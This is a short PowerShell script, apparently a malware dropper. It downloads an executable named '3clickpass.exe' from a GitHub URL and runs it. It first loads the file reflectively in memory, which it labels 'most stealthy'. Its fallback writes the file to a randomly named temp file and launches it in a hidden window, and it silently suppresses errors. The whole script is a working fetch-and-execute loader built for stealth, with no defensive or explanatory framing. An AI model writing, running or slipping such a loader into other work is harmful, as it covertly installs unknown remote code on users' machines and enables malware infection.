# File download and execution
$u = "https://github.com/meechtrades/meechtrades/raw/refs/heads/main/3clickpass.exe"

# Method 1: Memory loading (most stealthy)
try {
    $d = (New-Object Net.WebClient).DownloadData($u)
    [System.Reflection.Assembly]::Load($d).EntryPoint.Invoke($null, $null)
    exit
} catch {}

# Method 2: Temp file execution (fallback)
try {
    $p = $env:TEMP + "\" + [System.IO.Path]::GetRandomFileName() + ".tmp"
    (New-Object Net.WebClient).DownloadFile($u, $p)
    if (Test-Path $p) {
        $pr = New-Object System.Diagnostics.Process
        $pr.StartInfo.FileName = $p
        $pr.StartInfo.WindowStyle = 'Hidden'
        $pr.StartInfo.UseShellExecute = $false
        $pr.Start()
    }
} catch {}
